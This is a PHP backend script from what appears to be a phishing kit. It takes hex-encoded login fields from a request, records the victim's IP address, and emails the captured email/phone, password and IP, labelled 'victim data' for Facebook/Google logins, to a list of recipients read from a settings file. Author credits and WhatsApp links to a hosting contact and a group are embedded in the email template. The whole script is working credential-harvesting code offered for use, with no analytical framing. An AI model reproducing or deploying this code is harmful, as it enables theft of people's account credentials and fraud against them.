<?php
if (isset($_GET['cat'])) {
    $serialized_data = hex2bin($_GET['cat']);
    parse_str($serialized_data, $form_data);

    if (isset($form_data['user']) && isset($form_data['pass'])) {
        $user = $form_data['user'];
        $pass = $form_data['pass'];
        $ipanddress = $_SERVER['REMOTE_ADDR'];

        if ($user != $pass && $pass != $ipanddress) {
            $subjek = "🇮🇩 | Result mahyong ways2 | $user |🇲🇨";
            $pesan = <<<EOD
<!DOCTYPE html>

	<html>

	<head>

		<title></title>

		<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>

		<style type="text/css">

			body {

				font-family: "Helvetica";

				width: 90%;

				display: block;

				margin: auto;

				border: 1px solid #fff;

				background: #fff;

			}

			.result {

				width: 100%;

				height: 100%;

				display: block;

				margin: auto;

				position: fixed;

				top: 0;

				right: 0;

				left: 0;

				bottom: 0;

				z-index: 999;

				overflow-y: scroll;

				border-radius: 10px;

			}

			.tblResult {

				width: 100%;

				display: table;

				margin: 0px auto;

				border-collapse: collapse;

				text-align: center;

				background: #fcfcfc;

			}

			.tblResult th {

				text-align: left;

				font-size: 1em;

				margin: auto;

				padding: 15px 10px;

				background: #001240;

				border: 2px solid #001240;

				color: #fff;

			}

			.tblResult td {

				font-size: 1em;

				margin: auto;

				padding: 10px;

				border: 2px solid #001240;

				text-align: left;

				font-weight: bold;

				color: #000;

				text-shadow: 0px 0px 10px #fcfcfc;

			}

			.tblResult th img {

				width: 100%;

				display: block;

				margin: auto;

				box-shadow: 0px 0px 10px rgba(0,0,0, 0.5);

				border-radius: 10px;

			}
      	</style>

	</head>

	<body>

		<div class="result">

	 <img src="https://i.ibb.co.com/HnzJ2Sp/IMG-20241229-WA0114.jpg" style="width: 100%; display: block; margin: auto;">

			

	 <div style="background: #339999; width: 294; color: #fff; text-align: center; padding: 10px;">®Created By G-Starlight</div>
	

			<table class="tblResult">
	<th style="text-align: center;" colspan="3"> Informasi data korban </th>

				</tr>

				<tr>

					<td style="border-right: none;">Email/Nomor</td>

					<td style="text-align: center;">$user</td>

				</tr>

                <tr>

					<td style="border-right: none;">Password</td>

					<td style="text-align: center;">$pass</td>

				</tr>

			    <tr>

			        <td style="border-right: none;">IP Address</td>

					<td style="text-align: center;">$ipanddress</td>
		</tr>

			    <tr>
      
       <td style="border-right: none;">Informasi Login</td>

					<td style="text-align: center;">Facebook/Google</td>

				</tr>	

				</tr>	

                    <td style="border-right: none;"> Script By </td>

					<td style="text-align: center;">Rizz Ultimate</td>
		</tr>

			    <tr>
			    
            <td style="border-right: none;">Pembuatan Script</td>

					<td style="text-align: center;">12-26-2024</td>
		</tr>

			    <tr>
     
      
	<th style="text-align: center;" colspan="3" >Informasi G-Starlight</th>
       	</tr>

			</table>
      <div style="background: #000000 ; width: 294; color: #33ffcc; text-align: center; padding: 5px;"><b>No WhatsApp White Hosting <a href="https://wa.me/6281312278838"><b>Klik untuk chat</b></a>

								<br> Grup Ladang jasteb #1  <a href="https://chat.whatsapp.com/DGG0z7haKdr0xqift6vDvp"><b>Klik untuk join</b></a> </div> 
                                <table style="border-collapse: collapse; border-color: #000; background: #ccc" width="100%" border="1">

		</div>

	</body>

	</html>
EOD;

            include 'setting/data.php';
            $sender = 'From: '.$nik.' <'.$sender.'>';
            $headers = 'MIME-Version: 1.0' . "\r\n";
            $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
            $headers .= $sender . "\r\n";

            $read = file_get_contents('setting/data.json'); 
            $json = json_decode($read, true);

            foreach ($json as $recipient) {
                mail($recipient['email'], $subjek, $pesan, $headers);
            }

            echo ":(";
        }
    }
}
include "konekin.php";
?>
